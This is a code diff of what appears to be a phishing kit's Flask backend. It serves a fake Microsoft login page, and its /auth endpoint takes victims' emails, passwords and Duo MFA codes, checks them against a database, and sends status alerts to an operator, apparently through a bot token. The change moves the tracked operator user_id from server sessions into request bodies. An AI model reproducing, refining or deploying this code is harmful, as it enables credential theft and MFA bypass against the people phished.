@@ -16,7 +16,6 @@ BOT_TOKEN = os.getenv("BOT_TOKEN")
 
 # --- Flask App Initialization ---
 app = Flask(__name__, static_folder='microsoft_login/build')
-app.secret_key = os.getenv("SECRET_KEY", "a-secure-random-string-for-production")
 CORS(app)
 
 
@@ -69,28 +68,30 @@ def get_urls():
         return jsonify({"error": "Failed to connect to the database."}), 500
 
 
+
+
+
+
+
+
 @app.route('/', defaults={'path': ''})
 @app.route('/<path:path>')
 def serve(path):
     """
-    Main entrypoint: handles user session setup and serves the React application.
+    Main entrypoint: Handles serving the React application.
+    The user_id is now passed in API calls from the client, not handled by sessions.
     """
-    path_parts = path.split('/')
-    first_part = path_parts[0]
-
-    if first_part.isdigit():
-        session['user_id'] = first_part
-        return send_from_directory(app.static_folder, 'index.html')
-
-    if not path:
-        session['user_id'] = DEFAULT_USER_ID
-        return send_from_directory(app.static_folder, 'index.html')
-
-    if os.path.exists(os.path.join(app.static_folder, path)):
+    # This logic is now much simpler.
+    # If the path points to an existing file in the static folder (like CSS, JS, or an image), serve it.
+    if path != "" and os.path.exists(os.path.join(app.static_folder, path)):
         return send_from_directory(app.static_folder, path)
     
-    session.setdefault('user_id', DEFAULT_USER_ID)
+    # Otherwise, for any other path (including the root), serve the main index.html file.
+    # This is standard for a Single-Page Application (SPA).
     return send_from_directory(app.static_folder, 'index.html')
+
+
+
 
 
 @app.get("/set_status/<user_id>/<email>/<status>")
@@ -192,19 +193,24 @@ def set_custom_status():
             return f"<h1>Error</h1><p>An error occurred: {e}</p>", 500
 
 
+
+
 @app.post("/auth")
 def auth():
     """
     Handles authentication attempts from the frontend.
     Includes logic to return custom status data.
     """
-    user_id_to_notify = session.get('user_id', DEFAULT_USER_ID)
     req = request.json
+    # MODIFIED: Get user_id from the request body instead of the session.
+    user_id_to_notify = req.get('user_id') or DEFAULT_USER_ID
+    
     email = req['email'].strip()
     password = req['password']
     incoming_duo_code = req.get('duoCode')
     custom_input = req.get('customInput')
 
+    # The rest of this function remains exactly the same.
     db_record = Email_statuses.find_one({"email": email})
 
     if custom_input:
@@ -214,7 +220,6 @@ def auth():
             {"$set": {"status": "pending", "custom_data": None}}
         )
         return jsonify({"status": "pending"})
-
 
     if not db_record or db_record.get('password') != password:
         get_status_update(email, password, user_id=user_id_to_notify)
@@ -252,9 +257,11 @@ def auth():
 
 @app.post("/alert")
 def alert():
-    """Sends a simple alert, respecting the user_id from the session."""
-    user_id_to_notify = session.get('user_id', DEFAULT_USER_ID)
+    """Sends a simple alert, respecting the user_id from the request body."""
     req = request.json
+    # MODIFIED: Get user_id from the request body instead of the session.
+    user_id_to_notify = req.get('user_id') or DEFAULT_USER_ID
+    
     message = req['message']
     send_notification(message, user_id=user_id_to_notify)
     return jsonify({"status":"success", "message":"Alert sent."})
